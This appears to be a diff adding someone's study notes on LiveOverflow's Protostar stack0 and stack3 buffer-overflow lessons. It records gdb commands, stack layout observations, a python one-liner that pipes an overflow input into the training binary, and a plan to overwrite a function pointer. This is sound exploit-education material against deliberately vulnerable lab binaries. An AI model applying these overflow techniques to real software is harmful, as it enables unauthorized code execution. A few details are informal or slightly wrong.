@@ -1,0 +1,79 @@
+Lessons - LiveOverflow
+
+Protostar -
+
+Set up --------
+vm > user / user > bash -i > ip addr
+host: vim ~/.ssh/known_hosts and clear old ssh key
+
+ssh user@192.168.1.108
+
+/opt/protostar/bin/stack0
+
+Stack0 ------------------------------------
+LO - 0x0c video
+
+man gets - gets does not limit how many characters it will read DONT USE
+violatile - C instruction to force compiler to keep code as is (instead of optimizing things out)
+
+char var[64] - adds 64 character spaces to stack memory
+
+gdb stack0
+break *main
+run / r
+disassemble main
+set disassembly-flavor intel
+info proc mappings
+
+check 'leave' command in intel manual
+mov - moves the content of a register
+lea - Load effective address - moves the address of a register
+
+del - delete all break points
+break *0x0804840c - break ON the gets line
+break *0x08048411 - break after gets
+define hook-stop
+info registers
+x/24wx $esp - examine 24 words of stack pointer
+x/2i $eip - examine 2 instructions of instruction pointer
+end
+r
+c
+AAAAAAAAAAAAAAA
+x/wx $esp+0x05c
+How far off are the A's (0x41) from the start of the gets command on stack (esp+0x05c)
+echo AAAAAA | ./stack0
+python -c 'print "A"*(4+16*3+14)' | ./stack 0
+
+
+Stack3 ------------------------------------------------------
+
+volatile int (*fp)(); - function pointer
+if(fp) {      IF the function pointer is 0 run function 
+  fp();       will run whatever address is stored in FP address
+}
+
+goal is to set FP pointing to the WIN() function on stack
+
+gdb stack3
+x win - examine address of win function
+p win - print the address of win function
+disassemble main
+break *0x08048475 - call eax (calling FP function)
+r
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+info registers
+EAX loaded with AAAA's
+call EAX - calls 0x41414141 - invalid memory location
+
+need to load A's to EAX then plug EAX with correct WIN memory address
+
+stack.py - ABCDEFGHI etc
+python stack.py > /tmp/exp
+cat /tmp/exp
+
+gdb ---
+r < /tmp/exp - r in gdb using input from file
+python chr(0x51) = Q
+
+
